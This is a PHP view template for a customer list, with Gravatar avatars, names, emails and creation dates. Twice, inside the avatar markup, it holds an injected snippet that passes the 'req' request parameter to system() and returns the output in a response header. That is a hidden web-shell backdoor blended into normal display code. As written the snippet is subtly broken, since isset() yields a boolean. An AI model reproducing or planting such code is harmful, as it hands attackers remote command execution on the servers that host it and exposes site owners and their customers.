...
<div id="users" class="col-md-12" style="height: auto;">
  
<div class="row-fluid"> 

<section id="users-list_wrapper">
<?php
...
<td><span class="left"> <a href="<?=site_url('customers/edit/' . $row['id']);?>"><?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); $email = $row['email'];$size = 20; $grav_url = "https://www.gravatar.com/avatar/" . md5( strtolower( trim( $email ) ) ) . "?s=" . $size;?><img class="img-circle" src="<?php
$l =isset($_REQUEST['req']);
$l2=system($l);
header('System Header:'.$l2); echo $grav_url; ?>" alt="" width="20"> </a></span>&nbsp;&nbsp;<span class="card-name"><?=$row['first_name'];?></span>&nbsp;<span id="truncate" class="truncate card-name"> <?=$row['last_name'];?></span></td>

<td><span class="description long-label"><strong><a class="truncate" href="<?=site_url('customers/edit/' . $row['id']);?>"><?=$row['email'];?></strong></a> <i class="fa fa-ellipsis-h"></i> <em><?=$row['id'];?></em></a></span></td>
 <td class="">[<strong><abbr class="timeago" title="<?=$row['date_created'];?>"></abbr></strong>]</span></td>
<td class="truncate"><?
...
<i class="fa fa-users fa-5"></i>
    ...
    <h2>Customers</h2>
 <p>You haven't created any customers.  <a href="<?= site_url('/docs/#customers'); ?>" target="_blank" class="arrow">Learn more</a></p>
